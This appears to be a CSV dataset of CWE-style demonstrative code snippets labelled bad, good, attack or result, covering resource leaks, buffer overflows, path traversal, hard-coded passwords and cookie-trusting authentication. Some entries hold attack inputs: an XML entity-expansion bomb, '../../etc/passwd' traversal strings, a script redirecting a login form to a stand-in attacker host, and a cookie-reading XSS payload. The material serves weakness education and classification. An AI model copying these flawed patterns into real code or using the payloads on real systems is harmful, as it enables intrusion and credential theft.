771,
772,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private void processFile(string fName)
{
BufferReader in = new BufferReader(new FileReader(fName));
String line;
while ((line = in.ReadLine()) != null)
{
processLine(line);
}
}

               
example: 2
NATURE:bad:
LANGUAGE:C#:
                  
SqlConnection conn = new SqlConnection(connString);
SqlCommand cmd = new SqlCommand(queryString);
cmd.Connection = conn;
conn.Open();
SqlDataReader rdr = cmd.ExecuteReader();
HarvestResults(rdr);
conn.Connection.Close();

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
private void processFile(string fName) {
StreamWriter sw = new StreamWriter(fName);
string line;
while ((line = sr.ReadLine()) != null){
processLine(line);
}
}

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
try {
Connection con = DriverManager.getConnection(some_connection_string);
}
catch ( Exception e ) {
log( e );
}

               
example: 5
NATURE:bad:
LANGUAGE:C#:
                  
...
SqlConnection conn = new SqlConnection(connString);
SqlCommand cmd = new SqlCommand(queryString);
cmd.Connection = conn;
conn.Open();
SqlDataReader rdr = cmd.ExecuteReader();
HarvestResults(rdr);
conn.Connection.Close();
...

               
example: 6
NATURE:bad:
LANGUAGE:C:
                  
int decodeFile(char* fName) {

                        
char buf[BUF_SZ];
FILE* f = fopen(fName, ""r"");
if (!f) {
printf(""cannot open %s\n"", fName);
return DECODE_FAIL;
}
else {

                              
while (fgets(buf, BUF_SZ, f)) {
if (!checkChecksum(buf)) {
return DECODE_FAIL;
}
else {
decodeBlock(buf);
}
}

                           
}
fclose(f);
return DECODE_SUCCESS;

                     
}

               "
773,
774,
775,
776,"
example: 1
NATURE:attack:
LANGUAGE:XML:
                  
<?xml version=""1.0""?>
<!DOCTYPE MaliciousDTD [
<!ENTITY ZERO ""A"">
<!ENTITY ONE ""&ZERO;&ZERO;"">
<!ENTITY TWO ""&ONE;&ONE;"">
...
<!ENTITY THIRTYTWO ""&THIRTYONE;&THIRTYONE;"">
]>
<data>&THIRTYTWO;</data>

               "
777,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$dir = ""/home/cwe/languages"";
$lang = $_GET['lang'];
if (preg_match(""/[A-Za-z0-9]+/"", $lang)) {
include(""$dir/$lang"");
}
else {
echo ""You shall not pass!\n"";
}

               
example: 2
NATURE:attack:
                  
../../etc/passwd

               "
778,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<system.serviceModel>
<behaviors>
<serviceBehaviors>
<behavior name=""NewBehavior"">
<serviceSecurityAudit auditLogLocation=""Default""
suppressAuditFailure=""false""
serviceAuthorizationAuditLevel=""None""
messageAuthenticationAuditLevel=""None"" />

                              
...

                           

                        

                     
</system.serviceModel>

               
example: 2
NATURE:good:
LANGUAGE:XML:
                  
<system.serviceModel>
<behaviors>
<serviceBehaviors>
<behavior name=""NewBehavior"">
<serviceSecurityAudit auditLogLocation=""Default""
suppressAuditFailure=""false""
serviceAuthorizationAuditLevel=""SuccessAndFailure""
messageAuthenticationAuditLevel=""SuccessAndFailure"" />

                              
...

                           

                        

                     
</system.serviceModel>

               "
779,
780,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public Cipher getRSACipher() {
Cipher rsa = null;
try {
rsa = javax.crypto.Cipher.getInstance(""RSA/NONE/NoPadding"");
}
catch (java.security.NoSuchAlgorithmException e) {
log(""this should never happen"", e);
}
catch (javax.crypto.NoSuchPaddingException e) {
log(""this should never happen"", e);
}
return rsa;
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
public Cipher getRSACipher() {
Cipher rsa = null;
try {
rsa = javax.crypto.Cipher.getInstance(""RSA/ECB/OAEPWithMD5AndMGF1Padding"");
}
catch (java.security.NoSuchAlgorithmException e) {
log(""this should never happen"", e);
}
catch (javax.crypto.NoSuchPaddingException e) {
log(""this should never happen"", e);
}
return rsa;
}

               "
781,
782,
783,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define FAIL 0
#define SUCCESS 1

                     
...

                     
int validateUser(char *username, char *password) {

                        

                           
int isUser = FAIL;

                           

                           
// call method to authenticate username and password

                           

                           

                           
// if authentication fails then return failure otherwise return success

                           
if (isUser = AuthenticateUser(username, password) == FAIL) {
return isUser;
}
else {
isUser = SUCCESS;
}

                           
return isUser;

                     
}

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
...

                     
if ((isUser = AuthenticateUser(username, password)) == FAIL) {

                     
...

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public double calculateReturnOnInvestment(double currentValue, double initialInvestment) {

                        

                           
double returnROI = 0.0;

                           

                           
// calculate return on investment

                           
returnROI = currentValue - initialInvestment / initialInvestment;

                           
return returnROI;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
...

                     
returnROI = (currentValue - initialInvestment) / initialInvestment;

                     
...

               "
784,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""role"")) {
userRole = c.getValue();
}
}

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$auth = $_COOKIES['authenticated'];
if (! $auth) {

                        
if (AuthenticateUser($_POST['user'], $_POST['password']) == ""success"") {

                              

                                 

                                 
// save the cookie to send out in future responses

                                 
setcookie(""authenticated"", ""1"", time()+60*60*2);

                           
}
else {
ShowLoginScreen();
die(""\n"");
}

                     
}
DisplayMedicalHistory($_POST['patient_ID']);

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""authenticated"") && Boolean.TRUE.equals(c.getValue())) {
authenticated = true;
}
}

               "
785,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char *createOutputDirectory(char *name) {

                        
char outputDirectoryName[128];
if (getCurrentDirectory(128, outputDirectoryName) == 0) {
return null;
}
if (!PathAppend(outputDirectoryName, ""output"")) {
return null;
}
if (!PathAppend(outputDirectoryName, name)) {

                              

                                 
return null;

                           
}
if (SHCreateDirectoryEx(NULL, outputDirectoryName, NULL) != ERROR_SUCCESS) {

                              

                                 
return null;

                           
}
return StrDup(outputDirectoryName);

                     
}

               "
786,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* trimTrailingWhitespace(char *strMessage, int length) {

                        
char *retMessage;
char *message = malloc(sizeof(char)*(length+1));

                           

                           
// copy input string to a temporary string

                           
char message[length+1];
int index;
for (index = 0; index < length; index++) {
message[index] = strMessage[index];
}
message[index] = '\0';

                           

                           
// trim trailing whitespace

                           
int len = index-1;
while (isspace(message[len])) {
message[len] = '\0';
len--;
}

                           

                           
// return string without trailing whitespace

                           
retMessage = message;
return retMessage;

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  

                     
int main (int argc, char **argv) {
char *items[] = {""boat"", ""car"", ""truck"", ""train""};
int index = GetUntrustedOffset();
printf(""You selected %s\n"", items[index-1]);
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int main() {
...
strncpy(destBuf, &srcBuf[find(srcBuf, ch)], 1024);
...
}

               "
787,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int id_sequence[3];

                     
/* Populate the id array. */

                     
id_sequence[0] = 123;
id_sequence[1] = 234;
id_sequence[2] = 345;
id_sequence[3] = 456;

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int returnChunkSize(void *) {

                        

                           

                           
/* if chunk info is valid, return the size of usable memory,

                           

                           

                           
* else, return -1 to indicate an error

                           

                           

                           
*/

                           
...

                     
}
int main() {
...
memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));
...
}

               "
788,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int returnChunkSize(void *) {

                        

                           

                           
/* if chunk info is valid, return the size of usable memory,

                           

                           

                           
* else, return -1 to indicate an error

                           

                           

                           
*/

                           
...

                     
}
int main() {
...
memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));
...
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
char * copy_input(char *user_supplied_string){

                        
int i, dst_index;
char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);
if ( MAX_SIZE <= strlen(user_supplied_string) ){
die(""user string too long, die evil hacker!"");
}
dst_index = 0;
for ( i = 0; i < strlen(user_supplied_string); i++ ){

                              
if( '&' == user_supplied_string[i] ){
dst_buf[dst_index++] = '&';
dst_buf[dst_index++] = 'a';
dst_buf[dst_index++] = 'm';
dst_buf[dst_index++] = 'p';
dst_buf[dst_index++] = ';';
}
else if ('<' == user_supplied_string[i] ){

                                    

                                       

                                       
/* encode to &lt; */

                                       

                                    

                                 
}
else dst_buf[dst_index++] = user_supplied_string[i];

                           
}
return dst_buf;

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
int processMessageFromSocket(int socket) {

                        
int success;

                           
char buffer[BUFFER_SIZE];
char message[MESSAGE_SIZE];

                           

                           
// get message from socket and store into buffer

                           

                           

                           
//Ignoring possibliity that buffer > BUFFER_SIZE

                           
if (getMessage(socket, buffer, BUFFER_SIZE) > 0) {

                              

                                 

                                 
// place contents of the buffer into message structure

                                 
ExMessage *msg = recastBuffer(buffer);

                                 

                                 
// copy message body into string for processing

                                 
int index;
for (index = 0; index < msg->msgLength; index++) {
message[index] = msg->msgBody[index];
}
message[index] = '\0';

                                 

                                 
// process message

                                 
success = processMessage(message);

                           
}
return success;

                     
}

               "
789,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
unsigned int size = GetUntrustedInt();

                     
/* ignore integer overflow (CWE-190) for this example */

                     

                     
unsigned int totBytes = size * sizeof(char);
char *string = (char *)malloc(totBytes);
InitializeString(string);

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
unsigned int size = GetUntrustedInt();
HashMap list = new HashMap(size);

               
example: 3
NATURE:bad:
LANGUAGE:Perl:
                  
my $num = GetUntrustedNumber();
my @messages = ();

                     
$messages[$num] = ""Hello World"";

               "
790,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
791,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
792,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
793,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
794,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
795,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/^\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
796,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
$Username =~ s/^\.\.\///;
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
797,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $Username = GetUntrustedInput();
if (substr($Username, 0, 3) eq '../') {
$Username = substr($Username, 3);
}
my $filename = ""/home/user/"" . $Username;
ReadAndSendFile($filename);

               
example: 2
NATURE:attack:
                  
../../../etc/passwd

               
example: 3
NATURE:result:
                  
../../etc/passwd

               
example: 4
NATURE:result:
                  
/home/user/../../etc/passwd

               "
798,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
...
DriverManager.getConnection(url, ""scott"", ""tiger"");
...

               
example: 2
NATURE:attack:
                  
javap -c ConnMngr.class
22: ldc #36; //String jdbc:mysql://ixne.com/rxsql
24: ldc #38; //String scott
26: ldc #17; //String tiger

                  

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int VerifyAdmin(char *password) {

                        
if (strcmp(password, ""Mew!"")) {

                              

                                 
printf(""Incorrect Password!\n"");
return(0)

                           
}
printf(""Entering Diagnostic Mode...\n"");
return(1);

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
int VerifyAdmin(String password) {
if (passwd.Equals(""Mew!"")) {
return(0)
}
//Diagnostic Mode
return(1);
}

               
example: 5
NATURE:bad:
LANGUAGE:C:
                  
int VerifyAdmin(char *password) {

                        
if (strcmp(password,""68af404b513073584c4b6f22b6c63e6b"")) {

                              

                                 
printf(""Incorrect Password!\n"");
return(0);

                           
}
printf(""Entering Diagnostic Mode...\n"");
return(1);

                     
}

               
example: 6
NATURE:bad:
LANGUAGE:Java:
                  
public boolean VerifyAdmin(String password) {
if (password.equals(""68af404b513073584c4b6f22b6c63e6b"")) {
System.out.println(""Entering Diagnostic Mode..."");
return true;
}
System.out.println(""Incorrect Password!"");
return false;

                  

               
example: 7
NATURE:bad:
LANGUAGE:C#:
                  
int VerifyAdmin(String password) {
if (password.Equals(""68af404b513073584c4b6f22b6c63e6b"")) {
Console.WriteLine(""Entering Diagnostic Mode..."");
return(1);
}
Console.WriteLine(""Incorrect Password!"");
return(0);
}

               
example: 8
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...

               
example: 9
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
799,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char username[USERNAME_SIZE];
char password[PASSWORD_SIZE];

                     
while (isValidUser == 0) {

                        
if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {
if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {
isValidUser = AuthenticateUser(username, password);
}
}

                     
}
return(SUCCESS);

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
int count = 0;
while ((isValidUser == 0) && (count < MAX_ATTEMPTS)) {

                        
if (getNextMessage(socket, username, USERNAME_SIZE) > 0) {
if (getNextMessage(socket, password, PASSWORD_SIZE) > 0) {
isValidUser = AuthenticateUser(username, password);
}
}
count++;

                     
}
if (isValidUser) {
return(SUCCESS);
}
else {
return(FAIL);
}

               "
804,
805,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int returnChunkSize(void *) {

                        

                           

                           
/* if chunk info is valid, return the size of usable memory,

                           

                           

                           
* else, return -1 to indicate an error

                           

                           

                           
*/

                           
...

                     
}
int main() {
...
memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));
...
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
...
char source[21] = ""the character string"";
char dest[12];
strncpy(dest, source, sizeof(source)-1);
...

               
example: 4
NATURE:good:
LANGUAGE:C:
                  
...
char source[21] = ""the character string"";
char dest[12];
strncpy(dest, source, sizeof(dest)-1);
...

               
example: 5
NATURE:bad:
LANGUAGE:C:
                  
#define LOG_INPUT_SIZE 40

                     

                     
// saves the file name to a log file

                     
int outputFilenameToLog(char *filename, int length) {

                        
int success;

                           

                           
// buffer with size set to maximum size for input to log file

                           
char buf[LOG_INPUT_SIZE];

                           

                           
// copy filename to buffer

                           
strncpy(buf, filename, length);

                           

                           
// save to log file

                           
success = saveToLogFile(buf);

                           
return success;

                     
}

               
example: 6
NATURE:good:
LANGUAGE:C:
                  
...

                     
// copy filename to buffer

                     
strncpy(buf, filename, sizeof(buf)-1);
...

               "
806,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
...
char source[21] = ""the character string"";
char dest[12];
strncpy(dest, source, sizeof(source)-1);
...

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
...
char source[21] = ""the character string"";
char dest[12];
strncpy(dest, source, sizeof(dest)-1);
...

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
#define LOG_INPUT_SIZE 40

                     

                     
// saves the file name to a log file

                     
int outputFilenameToLog(char *filename, int length) {

                        
int success;

                           

                           
// buffer with size set to maximum size for input to log file

                           
char buf[LOG_INPUT_SIZE];

                           

                           
// copy filename to buffer

                           
strncpy(buf, filename, length);

                           

                           
// save to log file

                           
success = saveToLogFile(buf);

                           
return success;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:C:
                  
...

                     
// copy filename to buffer

                     
strncpy(buf, filename, sizeof(buf)-1);
...

               "
807,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""role"")) {
userRole = c.getValue();
}
}

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$auth = $_COOKIES['authenticated'];
if (! $auth) {
if (AuthenticateUser($_POST['user'], $_POST['password']) == ""success"") {
// save the cookie to send out in future responses
setcookie(""authenticated"", ""1"", time()+60*60*2);
}
else {
ShowLoginScreen();
die(""\n"");
}
}
DisplayMedicalHistory($_POST['patient_ID']);

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""authenticated"") && Boolean.TRUE.equals(c.getValue())) {
authenticated = true;
}
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
struct hostent *hp;struct in_addr myaddr;
char* tHost = ""trustme.example.com"";
myaddr.s_addr=inet_addr(ip_addr_string);

                     
hp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);
if (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {
trusted = true;
} else {
trusted = false;
}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
String ip = request.getRemoteAddr();
InetAddress addr = InetAddress.getByName(ip);
if (addr.getCanonicalHostName().endsWith(""trustme.com"")) {
trusted = true;
}

               
example: 6
NATURE:bad:
LANGUAGE:C#:
                  
IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);
IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);
if (hostInfo.HostName.EndsWith(""trustme.com"")) {
trusted = true;
}

               "
820,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
static void print (char * string) {

                        
char * word;
int counter;
for (word = string; counter = *word++; ) {

                              
putc(counter, stdout);
fflush(stdout);

                                 
/* Make timing window a little larger... */

                                 

                                 
sleep(1);

                           
}

                     
}

                     
int main(void) {

                        
pid_t pid;

                           
pid = fork();
if (pid == -1) {
exit(-2);
}
else if (pid == 0) {
print(""child\n"");
}
else {
print(""PARENT\n"");
}
exit(0);

                     
}

               "
821,
822,
823,
824,
825,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* ptr = (char*)malloc (SIZE);
if (err) {
abrt = 1;
free(ptr);
}
...
if (abrt) {
logError(""operation aborted before commit"", ptr);
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char* ptr = (char*)malloc (SIZE);
...
if (abrt) {
free(ptr);
}
...
free(ptr);

               "
826,
827,
828,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char *logMessage;

                     
void handler (int sigNum) {

                        
syslog(LOG_NOTICE, ""%s\n"", logMessage);
free(logMessage);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);
exit(0);

                     
}

                     
int main (int argc, char* argv[]) {

                        
logMessage = strdup(argv[1]);

                           
/* Register signal handlers. */

                           

                           
signal(SIGHUP, handler);
signal(SIGTERM, handler);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
#include <signal.h>
#include <syslog.h>
#include <string.h>
#include <stdlib.h>

                     
void *global1, *global2;
char *what;
void sh (int dummy) {

                        
syslog(LOG_NOTICE,""%s\n"",what);
free(global2);
free(global1);

                           
/* Sleep statements added to expand timing window for race condition */

                           

                           
sleep(10);
exit(0);

                     
}

                     
int main (int argc,char* argv[]) {

                        
what=argv[1];
global1=strdup(argv[2]);
global2=malloc(340);
signal(SIGHUP,sh);
signal(SIGTERM,sh);

                           
/* Sleep statements added to expand timing window for race condition */

                           

                           
sleep(10);
exit(0);

                     
}

               "
829,"
example: 1
NATURE:bad:
LANGUAGE:HTML:
                  
<div class=""header""> Welcome!
<div id=""loginBox"">Please Login:
<form id =""loginForm"" name=""loginForm"" action=""login.php"" method=""post"">
Username: <input type=""text"" name=""username"" />
<br/>
Password: <input type=""password"" name=""password"" />
<input type=""submit"" value=""Login"" />
</form>
</div>
<div id=""WeatherWidget"">
<script type=""text/javascript"" src=""externalDomain.example.com/weatherwidget.js""></script>
</div>
</div>

               
example: 2
NATURE:attack:
LANGUAGE:JavaScript:
                  

                     

                     
...Weather widget code....

                     
document.getElementById('loginForm').action = ""ATTACK.example.com/stealPassword.php"";

               "
830,"
example: 1
NATURE:bad:
LANGUAGE:HTML:
                  
<div class=""header""> Welcome!
<div id=""loginBox"">Please Login:
<form id =""loginForm"" name=""loginForm"" action=""login.php"" method=""post"">
Username: <input type=""text"" name=""username"" />
<br/>
Password: <input type=""password"" name=""password"" />
<input type=""submit"" value=""Login"" />
</form>
</div>
<div id=""WeatherWidget"">
<script type=""text/javascript"" src=""externalDomain.example.com/weatherwidget.js""></script>
</div>
</div>

               
example: 2
NATURE:attack:
LANGUAGE:JavaScript:
                  

                     

                     
...Weather widget code....

                     
document.getElementById('loginForm').action = ""ATTACK.example.com/stealPassword.php"";

               "
831,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void handler (int sigNum) {
...
}

                     
int main (int argc, char* argv[]) {
signal(SIGUSR1, handler)
signal(SIGUSR2, handler)
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char *logMessage;

                     
void handler (int sigNum) {

                        
syslog(LOG_NOTICE, ""%s\n"", logMessage);
free(logMessage);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);
exit(0);

                     
}

                     
int main (int argc, char* argv[]) {

                        
logMessage = strdup(argv[1]);

                           
/* Register signal handlers. */

                           

                           
signal(SIGHUP, handler);
signal(SIGTERM, handler);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);

                     
}

               "
832,
833,
834,
835,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int processMessagesFromServer(char *hostaddr, int port) {

                        
...
int servsock;
int connected;
struct sockaddr_in servaddr;

                           

                           
// create socket to connect to server

                           
servsock = socket( AF_INET, SOCK_STREAM, 0);
memset( &servaddr, 0, sizeof(servaddr));
servaddr.sin_family = AF_INET;
servaddr.sin_port = htons(port);
servaddr.sin_addr.s_addr = inet_addr(hostaddr);

                           
do {

                              

                                 

                                 
// establish connection to server

                                 
connected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));

                                 

                                 
// if connected then read and process messages from server

                                 
if (connected > -1) {

                                    

                                       

                                       
// read and process messages

                                       
...

                                 
}

                              

                           

                           

                           
// keep trying to establish connection to the server

                           
} while (connected < 0);

                           

                           
// close socket and return success or failure

                           
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
int processMessagesFromServer(char *hostaddr, int port) {

                        
...

                           
// initialize number of attempts counter

                           
int count = 0;
do {

                              

                                 

                                 
// establish connection to server

                                 
connected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));

                                 

                                 
// increment counter

                                 
count++;

                                 

                                 
// if connected then read and process messages from server

                                 
if (connected > -1) {

                                    

                                       

                                       
// read and process messages

                                       
...

                                 
}

                              

                           

                           

                           
// keep trying to establish connection to the server

                           

                           

                           
// up to a maximum number of attempts

                           
} while (connected < 0 && count < MAX_ATTEMPTS);

                           

                           
// close socket and return success or failure

                           
...

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public boolean isReorderNeeded(String bookISBN, int rateSold) {

                        

                           
boolean isReorder = false;

                           
int minimumCount = 10;
int days = 0;

                           

                           
// get inventory count for book

                           
int inventoryCount = inventory.getIventoryCount(bookISBN);

                           

                           
// find number of days until inventory count reaches minimum

                           
while (inventoryCount > minimumCount) {

                              

                                 
inventoryCount = inventoryCount - rateSold;
days++;

                              

                           
}

                           

                           
// if number of days within reorder timeframe

                           

                           

                           
// set reorder return boolean to true

                           
if (days > 0 && days < 5) {
isReorder = true;
}

                           
return isReorder;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
public boolean isReorderNeeded(String bookISBN, int rateSold) {

                        
...

                           

                           
// validate rateSold variable

                           
if (rateSold < 1) {
return isReorder;
}

                           
...

                     
}

               "
836,
837,
838,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$username = $_POST['username'];
$picSource = $_POST['picsource'];
$picAltText = $_POST['picalttext'];

                     
...

                     

                     
echo ""<title>Welcome, "" . htmlentities($username) .""</title>"";
echo ""<img src='"". htmlentities($picSource) ."" ' alt='"". htmlentities($picAltText) . '"" />';

                     
...

                     

                  

               
example: 2
NATURE:attack:
                  
""altTextHere' onload='alert(document.cookie)""

               
example: 3
NATURE:result:
LANGUAGE:HTML:
                  
<img src='pic.jpg' alt='altTextHere' onload='alert(document.cookie)' />

               "
